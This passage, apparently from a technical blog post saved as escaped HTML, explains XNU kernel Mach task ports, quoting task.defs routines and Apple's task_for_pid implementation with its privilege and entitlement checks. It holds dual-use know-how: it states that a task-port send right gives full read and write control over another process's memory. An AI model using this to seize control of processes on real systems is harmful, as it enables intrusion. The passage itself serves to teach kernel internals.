    &lt;span class=&quot;mi&quot;&gt;108&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;routine&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host_page_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;109&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;110&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;routine&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_host_page_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;111&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;112&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;		&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;113&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;out_page_size&lt;/span&gt;	&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vm_size_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;114&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Similarly, the task ports serve as an abstraction over the task. The APIs can be found under &lt;strong&gt;osfmk/mach/task.defs&lt;/strong&gt; or &lt;strong&gt;osfmk/mach/task.defs&lt;/strong&gt; in the &lt;strong&gt;BUILD&lt;/strong&gt; folder in the kernel.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;defs&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;409&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*
    410:  * Read the selected state which is to be installed on new 
    411:  * threads in the task as they are created.
    412:  */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;413&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;routine&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_get_state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;414&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;		&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;415&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;flavor&lt;/span&gt;		&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;thread_state_flavor_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;416&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;old_state&lt;/span&gt;	&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;thread_state_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CountInOut&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;417&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;  
    &lt;span class=&quot;mi&quot;&gt;418&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*
    419:  * Set the selected state information to be installed on
    420:  * all subsequently created threads in the task.
    421:  */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;422&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;routine&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;task_set_state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;423&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;		&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;424&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;flavor&lt;/span&gt;		&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;thread_state_flavor_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;425&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;new_state&lt;/span&gt;	&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;thread_state_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;426&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;427&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*
    428:  * Change the task's physical footprint limit (in MB).
    429:  */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;430&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;routine&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_set_phys_footprint_limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;431&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;		&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;432&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;new_limit&lt;/span&gt;	&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;433&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;old_limit&lt;/span&gt;	&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;434&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;435&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;routine&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_suspend2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;436&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;target_task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;437&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;suspend_token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_suspension_token_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;438&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;439&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;routine&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;task_resume2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;440&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;suspend_token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_suspension_token_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;441&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;These APIs are quite powerful and allow full interaction with the target task. Having a send right to the task port of a process will give full control over that task, which includes reading, writing and allocating of memory in the target tasks memory region. Btw, we are mentioning Task (coming from Mach) ports of a process (coming from BSD), this might seem wierd and it is important to note that while these are 2 different flavours of Mach, they are internally linked. Every associated BSD process has a corresponding Mach task and vice versa. The task struct can be found under &lt;strong&gt;osfmk/kern/task.h&lt;/strong&gt; , this has a &lt;strong&gt;bsd_info&lt;/strong&gt; field which is a pointer to the &lt;strong&gt;proc&lt;/strong&gt; structure in &lt;strong&gt;bsd/sys/proc_internal.h&lt;/strong&gt;. Similarly, the task field in the proc structure is a pointer to the task structure of that process.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/21.png&quot; alt=&quot;21&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using the Mach Trap &lt;strong&gt;task_for_pid&lt;/strong&gt;, it is possible to get a send right to the task port corresponding to the target PID to the caller. As can be seen from the comments below in the implementation in the file &lt;strong&gt;bsd/vm/vm_unix.c&lt;/strong&gt;, it is only permitted to privileged processes or processes with the same user ID. Apart from being privileged, calling this API also requires certain entitlements (&lt;strong&gt;get-task-allow&lt;/strong&gt; and &lt;strong&gt;task_for_pid-allow&lt;/strong&gt;).&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bsd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm_unix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;749&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*
    750:  *	Routine:	task_for_pid
    751:  *	Purpose:
    752:  *		Get the task port for another &quot;process&quot;, named by its
    753:  *		process ID on the same host as &quot;target_task&quot;.
    754:  *
    755:  *		Only permitted to privileged processes, or processes
    756:  *		with the same user ID.
    757:  *
    758:  *		Note: if pid == 0, an error is return no matter who is calling.
    759:  *
    760:  * XXX This should be a BSD system call, not a Mach trap!!!
    761:  */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;762&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;763&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_for_pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;764&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_for_pid_args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;765&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;766&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;mach_port_name_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;target_tport&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target_tport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;767&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;			&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;768&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;user_addr_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;task_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;769&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;proc_t&lt;/span&gt; 			&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PROC_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;770&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;task_t&lt;/span&gt;			&lt;span class=&quot;n&quot;&gt;t1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TASK_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;771&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;mach_port_name_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;tret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;772&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;  	&lt;span class=&quot;n&quot;&gt;ipc_port_t&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;tfpport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;773&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sright&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;774&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;775&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;776&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;AUDIT_MACH_SYSCALL_ENTER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AUE_TASKFORPID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;777&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;AUDIT_ARG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;778&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;AUDIT_ARG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_port1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target_tport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;779&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;780&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;cm&quot;&gt;/* Always check if pid == 0 */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;781&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;782&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;copyout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_port_name_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;783&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;AUDIT_MACH_SYSCALL_EXIT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KERN_FAILURE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;784&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KERN_FAILURE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;785&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;786&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;787&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;t1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_name_to_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target_tport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;788&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TASK_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;789&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;copyout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_port_name_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;790&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;AUDIT_MACH_SYSCALL_EXIT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KERN_FAILURE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;791&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KERN_FAILURE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;792&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;793&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;794&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;795&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc_find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;796&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PROC_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;797&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_FAILURE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
